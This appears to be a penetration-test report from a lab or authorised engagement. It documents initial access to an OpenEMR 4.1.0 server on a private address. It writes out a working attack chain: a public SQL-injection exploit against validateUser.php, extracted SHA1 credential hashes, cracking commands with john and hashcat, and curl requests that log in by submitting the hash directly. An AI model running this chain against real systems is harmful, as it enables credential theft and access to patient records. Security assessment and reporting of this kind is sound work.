# Phase 4 - Initial Access

Date: 2026-09-19
Operator system: Kali Linux (attacker) -> OPFOR-02 (target)
Objective: Establish an authorised foothold through a discovered network-facing weakness.

## Tools Used
- python3 (exploit 49742.py)
- john v1.9
- hashcat v7.1.2
- curl

## Attack Chain Executed

### Step 1 - Unauthenticated SQL Injection (49742.py)
Command:

python3 49742.py

Target endpoint: http://192.168.254.128/openemr/interface/login/validateUser.php?u=

Result: Time-based blind SQL injection successfully enumerated the OpenEMR users table and extracted two credential pairs:

| Username | Hash | Type |
|----------|------|------|
| admin | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 | SHA1 |
| medical | ab24aed5a7c4ad45615cd7e0da816eea39e4895d | SHA1 |

### Step 2 - Hash Cracking
Commands:

john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt openemr_hashes.txt
hashcat -m 100 openemr_hashes.txt /usr/share/wordlists/rockyou.txt

Result: Both hashes cracked in under 1 second from the first 7.24 percent of rockyou.txt:

| Username | Hash | Plaintext |
|----------|------|-----------|
| admin | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 | ackbar |
| medical | ab24aed5a7c4ad45615cd7e0da816eea39e4895d | medical |

### Step 3 - Authentication Bypass Observation
Initial login attempts using cleartext passwords via curl failed (HTTP 302 to error=1). Analysis of login.php source captured in Phase 2 revealed that the application performs client-side SHA1 hashing of the password in JavaScript before form submission. The server-side endpoint only validates the pre-hashed authPass field, not clearPass.

Correction: authPass field populated with the SHA1 hash directly, clearPass left empty.

### Step 4 - Confirmed Authentication
Commands:

curl -s -i -c admin_cookies.txt -X POST
"http://192.168.254.128/openemr/interface/main/main_screen.php?auth=login&site=default"
-d "authProvider=Default&authUser=admin&clearPass=&authPass=3863efef9ee2bfbc51ecdca359c6302bed1389e8&languageChoice=1"

curl -s -i -c medical_cookies.txt -X POST
"http://192.168.254.128/openemr/interface/main/main_screen.php?auth=login&site=default"
-d "authProvider=Default&authUser=medical&clearPass=&authPass=ab24aed5a7c4ad45615cd7e0da816eea39e4895d&languageChoice=1"

Result:

| Account | HTTP Response | Status |
|---------|---------------|--------|
| admin | HTTP 200 OK | Authenticated |
| medical | HTTP 200 OK | Authenticated |

## Entry Point Summary
- Affected service: OpenEMR 4.1.0 HTTP on port 80
- Vulnerability: Unauthenticated time-based blind SQL injection in validateUser.php
- Entry point: /openemr/interface/login/validateUser.php?u=
- Resulting context: Authenticated session as admin and medical users
- Business/security impact: Complete compromise of OpenEMR user credential store. An attacker with no prior knowledge or access can extract all application credentials without authentication, then access a medical records management system containing sensitive patient data.

## Evidence References
- 04_evidence_hashes/openemr_hashes.txt
- 04_evidence_hashes/openemr_cracked_creds.txt
- 01_scans/searchsploit_openemr_phase3.txt
